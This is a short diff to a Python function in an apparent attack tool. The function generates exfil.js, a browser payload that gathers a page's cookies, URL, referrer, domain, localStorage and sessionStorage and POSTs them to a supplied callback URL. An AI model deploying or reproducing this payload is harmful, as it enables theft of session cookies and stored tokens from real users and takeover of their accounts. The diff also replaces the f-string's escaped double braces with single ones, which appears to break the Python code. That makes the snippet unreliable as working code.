@@ -228,20 +228,20 @@ def generate_full_exfil_js(callback_url: str) -> str:
     Returns: Relative path for serving
     """
     content = f'''// Full data exfiltration
-let data = {{
+let data = {
     cookie: document.cookie,
     url: window.location.href,
     referrer: document.referrer,
     domain: document.domain,
     title: document.title,
-    localStorage: Object.entries(window.localStorage || {{}}),
-    sessionStorage: Object.entries(window.sessionStorage || {{}})
-}};
-fetch('{callback_url}', {{
+    localStorage: Object.entries(window.localStorage || {}),
+    sessionStorage: Object.entries(window.sessionStorage || {})
+};
+fetch('{callback_url}', {
     method: 'POST',
-    headers: {{'Content-Type': 'application/json'}},
+    headers: {'Content-Type': 'application/json'},
     body: JSON.stringify(data)
-}});'''
+});'''
 
     return write_payload("exfil.js", content)
 
